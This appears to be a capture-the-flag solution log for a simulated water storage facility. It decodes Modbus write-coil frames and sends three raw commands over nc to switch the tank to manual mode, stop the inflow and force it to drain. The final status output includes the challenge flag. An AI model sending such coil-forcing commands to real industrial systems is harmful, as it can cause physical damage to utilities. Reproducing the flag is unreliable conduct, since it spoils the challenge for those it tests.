#https://drive.google.com/file/d/1Jfios3ZE5Yq43RHJQUa-H3AUd8vwSYdK/view

'''
[1-2]: Slave ID (82)
[3-4]: Function code (05=write)
[5-8]: Coil adress
[9-12]: Value
[13-16]: CRT (security check but we don’t need it)

Empty the water tank
manual_mode ON: 520526dbFF00
stop_in ON: 5205001aFF00
foce_out ON: 52050034FF00

oot@ubuntu-s-1vcpu-1gb-lon1-01:~/htb/ctf/HW# nc 134.122.104.91 32356
Water Storage Facility Interface
1. Get status of system
2. Send modbus command
3. Exit
Select: 2
Modbus command: 520526dbFF00
Modbus command sent to the network!
1. Get status of system
2. Send modbus command
3. Exit
Select: 2
Modbus command: 5205001aFF00
Modbus command sent to the network!
1. Get status of system
2. Send modbus command
3. Exit
Select: 2
Modbus command: 52050034FF00
Modbus command sent to the network!
1. Get status of system
2. Send modbus command
3. Exit
Select: 1
{"auto_mode": 0, "manual_mode": 1, "stop_out": 0, "stop_in": 1, "low_sensor": 0, "high_sesnor": 0, "in_valve": 0, "out_valve": 1, "flag": "HTB{14dd32_1091c_15_7h3_1091c_c12cu175_f02_1ndu572141_5y573m5}"}
'''
